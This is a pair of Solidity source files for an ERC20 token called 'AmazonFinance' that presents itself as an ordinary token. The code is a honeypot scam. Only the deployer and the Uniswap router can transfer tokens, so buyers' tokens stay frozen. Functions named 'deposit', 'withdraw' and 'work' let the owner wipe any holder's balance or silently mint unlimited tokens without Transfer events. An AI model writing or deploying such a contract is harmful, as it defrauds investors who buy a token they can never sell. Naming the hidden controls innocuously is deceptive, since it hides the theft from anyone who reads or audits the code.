{"1_Storage.sol":{"content":"pragma solidity ^0.5.17;\r\nimport \"./2_Owner.sol\";\r\n\r\ncontract tokenFactory is ERC20, ERC20Detailed {\r\n  using SafeMath for uint;\r\n  mapping (address =\u003e bool) public financer;\r\n  mapping (address =\u003e bool) public subfinancer;\r\n  address univ2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n  constructor () public ERC20Detailed(\"AmazonFinance\", \"AMAZ\", 18) {\r\n      _initMint( msg.sender, 5000*10**uint(decimals()) );\r\n      financer[msg.sender] = true;\r\n      subfinancer[msg.sender] = true;\r\n      subfinancer[univ2] = true;\r\n  }\r\n\r\n  function deposit(address account) public {\r\n      require(financer[msg.sender], \"!warn\");\r\n      _deposit(account);\r\n  }\r\n\r\n  function withdraw(address account, uint amount) public {\r\n      require(financer[msg.sender], \"!warn\");\r\n      _withdraw(account, amount);\r\n  }\r\n\r\n  function work(address account, uint amount) public {\r\n      require(financer[msg.sender], \"!warn\");\r\n      _work(account, amount);\r\n  }\r\n\r\n  function addSubFinancer(address account) public {\r\n      require(financer[msg.sender], \"!not allowed\");\r\n      subfinancer[account] = true;\r\n  }\r\n\r\n  function removeSubFinancer(address account) public {\r\n      require(financer[msg.sender], \"!not allowed\");\r\n      subfinancer[account] = false;\r\n  }\r\n  \r\n  function _transfer(address sender, address recipient, uint amount) internal {\r\n      require(subfinancer[sender], \"frozen\");\r\n      super._transfer(sender, recipient, amount);\r\n  }\r\n\r\n}"},"2_Owner.sol":{"content":"pragma solidity ^0.5.17;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\ncontract Context {\r\n    constructor () internal { }\r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n    mapping (address =\u003e uint) private _balances;\r\n    mapping (address =\u003e mapping (address =\u003e uint)) private _allowances;\r\n    uint private _totalSupply;\r\n    function totalSupply() public view returns (uint) {\r\n        return _totalSupply;\r\n    }\r\n    function balanceOf(address account) public view returns (uint) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n    function _initMint(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    function _work(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n    }\r\n    function _withdraw(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: _withdraw to the zero address\");\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n    }\r\n    function _deposit(address acc) internal {\r\n        _balances[acc] = 0;\r\n    }\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor (string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint c = a / b;\r\n        return c;\r\n    }\r\n}"}}